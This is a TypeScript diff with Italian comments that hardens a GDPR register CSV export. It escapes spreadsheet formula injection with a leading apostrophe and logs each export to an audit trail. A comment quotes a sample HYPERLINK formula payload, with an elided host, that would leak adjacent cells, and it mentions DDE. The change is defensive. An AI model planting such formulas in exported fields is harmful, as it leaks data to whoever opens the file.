@@ -1,5 +1,7 @@
 import { registroPerTipo } from "@gdpr/engine";
 import { registroDi } from "@/features/registri/dati";
+import { requireStudio } from "@/features/auth/guards";
+import { registra } from "@/lib/audit";
 
 // L'ESPORTAZIONE DEL REGISTRO.
 //
@@ -23,9 +25,25 @@ export const dynamic = "force-dynamic";
 const CSV_BOM = "﻿"; // Excel in italiano legge l'UTF-8 solo se glielo si dichiara.
 
 /** Una cella CSV. Il punto e virgola è il separatore che Excel italiano si aspetta. */
-function cella(v: unknown): string {
+export function cella(v: unknown): string {
   if (v === null || v === undefined) return "";
-  const s = typeof v === "boolean" ? (v ? "sì" : "no") : String(v);
+  let s = typeof v === "boolean" ? (v ? "sì" : "no") : String(v);
+
+  // NEUTRALIZZA LE FORMULE, che il quoting del CSV non tocca.
+  //
+  // Le virgolette qui sotto rendono il file un CSV valido; non impediscono a Excel di
+  // ESEGUIRE una cella. Il titolo di una voce di registro arriva dall'utente senza filtro
+  // sul primo carattere, quindi un collaboratore puo' aprire una voce intitolata
+  // `=HYPERLINK("http://…"&A1;"Apri")` e far esfiltrare le celle vicine, oppure usare DDE.
+  //
+  // Lo scenario non e' teorico, ed e' la ragione per cui vale la pena: questo file si
+  // esporta per il GARANTE (art. 30.3, «in forma scritta, anche in formato elettronico»)
+  // e si apre in Excel. Il bersaglio non e' solo interno.
+  //
+  // L'apostrofo iniziale e' la convenzione che i fogli di calcolo leggono come «questo e'
+  // testo». Chi apre il file vede il titolo; la formula non parte.
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+
   return /[";\n\r]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
 }
 
@@ -76,6 +94,18 @@ export async function GET(
     /[^\p{L}\p{N} .\-]/gu,
     "",
   );
+
+  // OGNI USCITA DI DATI LASCIA UNA RIGA (vedi `api/evidenze`): il registro copriva le
+  // mutazioni e nessuna lettura, quindi un'esfiltrazione non lasciava traccia.
+  const ctx = await requireStudio();
+  await registra({
+    organizationId: ctx.organizationId,
+    userId: ctx.userId,
+    azione: "registro.esporta",
+    entita: "registro",
+    entitaId: id,
+    dettagli: { tipo, voci: voci.length },
+  });
 
   return new Response(corpo, {
     headers: {
